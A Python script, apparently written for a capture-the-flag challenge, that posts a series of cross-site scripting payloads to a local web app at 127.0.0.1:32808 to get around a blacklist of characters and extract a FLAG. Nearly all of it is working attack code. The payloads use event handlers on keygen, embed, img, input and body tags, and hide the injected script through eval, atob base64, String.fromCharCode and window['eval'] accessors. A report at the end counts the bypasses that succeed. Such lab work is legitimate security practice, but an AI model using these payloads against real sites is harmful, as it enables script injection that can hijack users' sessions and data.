import requests
import urllib.parse
import re

target = "http://127.0.0.1:32808"
endpoint = "/page"

def send_payload(payload, test_name):
    """Send payload and check response"""
    data = {'name': payload}
    response = requests.post(target + endpoint, data=data)
    
    has_filter = "Sorry you can't use:" in response.text
    filter_match = re.search(r"Sorry you can't use: '([^']+)'", response.text)
    blocked_content = filter_match.group(1) if filter_match else None
    
    is_reflected = payload in response.text
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    has_flag = len(flag_matches) > 0
    
    # Also check if any JavaScript execution indicators
    execution_indicators = []
    if 'confirm' in response.text or 'prompt' in response.text or 'eval' in response.text:
        execution_indicators.append("JS keywords found")
    
    print(f"\n=== {test_name} ===")
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Filter: {has_filter}")
    if blocked_content:
        print(f"Blocked: '{blocked_content}'")
    print(f"Reflected: {is_reflected}")
    print(f"Flag: {flag_matches if has_flag else 'None'}")
    if execution_indicators:
        print(f"Indicators: {execution_indicators}")
    
    return {
        'test_name': test_name,
        'payload': payload,
        'status_code': response.status_code,
        'has_filter': has_filter,
        'blocked_content': blocked_content,
        'is_reflected': is_reflected,
        'has_flag': has_flag,
        'flag_matches': flag_matches,
        'response_text': response.text if (is_reflected or has_flag) else None
    }

print("="*70)
print("ULTIMATE BYPASS - ONLY ALLOWED CHARACTERS IN PAYLOAD")
print("="*70)

results = []

# Test 1: Use keygen tag (no blocked letters in "keygen")
print("\n[+] Testing keygen tag (no a,s,c,r,i,p,t,o,n in tag name)")
keygen_tests = [
    # keygen is allowed, use onfocus, but need to avoid blocked letters in JS
    # Use confirm (has 'c','o','n') - need to encode
    ("<keygen autofocus onfocus=eval('confirm(1)')>", "keygen eval confirm"),
    ("<keygen autofocus onfocus=eval(atob('Y29uZmlybSgxKQ=='))>", "keygen base64"),
    ("<keygen autofocus onfocus=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "keygen fromCharCode"),
]

for payload, name in keygen_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

# Test 2: Use embed tag
print("\n[+] Testing embed tag")
embed_tests = [
    ("<embed src=x onerror=eval('confirm(1)')>", "embed eval"),
    ("<embed src=x onerror=eval(atob('Y29uZmlybSgxKQ=='))>", "embed base64"),
    ("<embed src=x onerror=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "embed fromCharCode"),
]

for payload, name in embed_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

# Test 3: Minimal JavaScript - find functions without blocked letters
print("\n[+] Testing minimal JavaScript payloads")
minimal_tests = [
    # Use prompt instead of confirm/alert - prompt doesn't have a,c,s,r,i,p,t,o,n
    # wait, prompt has 'p' - can't use that either
    
    # Use eval with minimal content - just prove execution
    ("<img src=x onerror=eval('1+1')>", "eval 1+1"),
    
    # Use console.log (has 'c','o','n','s','l','o','g' - many blocked)
    # Use document.write (has 'c','r','i','p','t' - blocked)
    
    # Try throw (t,h,r,o,w - contains blocked letters)
    
    # Use just eval() with something simple
    ("<img src=x onerror=eval(true)>", "eval true"),
    ("<img src=x onerror=eval(false)>", "eval false"),
]

for payload, name in minimal_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

# Test 4: Try accessing window methods via property access
print("\n[+] Testing property access methods")
property_tests = [
    # Use window['eval'] instead of eval
    ("<img src=x onerror=window['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))>", "window eval"),
    
    # Use this[] accessor
    ("<img src=x onerror=this['eval'](String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "this eval"),
    
    # Use self[] accessor
    ("<img src=x onerror=self['eval'](String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "self eval"),
    
    # Use parent[] accessor
    ("<img src=x onerror=parent['eval'](String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "parent eval"),
]

for payload, name in property_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

# Test 5: Use different event handlers
print("\n[+] Testing different event handlers")
event_tests = [
    # onload (has 'a' in name though - might be blocked)
    ("<body onload=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "body onload"),
    
    # onfocus
    ("<input autofocus onfocus=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "input onfocus"),
    
    # onblur
    ("<input onblur=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "input onblur"),
    
    # onmouseenter
    ("<img src=x onmouseenter=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "img onmouseenter"),
]

for payload, name in event_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

# Test 6: Most extreme - use only characters that are visually similar
print("\n[+] Testing extreme obfuscation")
extreme_tests = [
    # Use backticks instead of parentheses where possible
    ("<img src=x onerror=alert`1`>", "alert backtick"),
    
    # Use throw without catch - throws to console
    ("<img src=x onerror=throw 1>", "throw 1"),
    
    # Use something that will visibly error if executed
    ("<img src=x onerror=eval('xxxxxx')>", "eval error"),
]

for payload, name in extreme_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

# Final analysis
print("\n" + "="*70)
print("FINAL ANALYSIS")
print("="*70)

successful = [r for r in results if not r['has_filter'] and r['is_reflected']]
blocked = [r for r in results if r['has_filter']]
all_flags = []
for r in results:
    if r['has_flag']:
        all_flags.extend(r['flag_matches'])

print(f"Total attempts: {len(results)}")
print(f"Successful bypasses: {len(successful)}")
print(f"Blocked by filter: {len(blocked)}")

if blocked:
    blocked_chars = {}
    for b in blocked:
        if b['blocked_content']:
            char = b['blocked_content']
            blocked_chars[char] = blocked_chars.get(char, 0) + 1
    
    print(f"\nMost blocked characters:")
    for char, count in sorted(blocked_chars.items(), key=lambda x: x[1], reverse=True)[:8]:
        print(f"  '{char}': {count} times")

if successful:
    print(f"\n[!!!] SUCCESSFUL BYPASSES:")
    for s in successful:
        print(f"  ✓ {s['test_name']}")
        print(f"    {s['payload']}")
else:
    print(f"\n[-] No successful bypasses - filter is extremely effective")

if all_flags:
    print(f"\n{'='*70}")
    print(f"FLAGS FOUND: {all_flags}")
    print(f"{'='*70}")
else:
    print(f"\n[-] No FLAG{{}} patterns found")

print("\n" + "="*70)

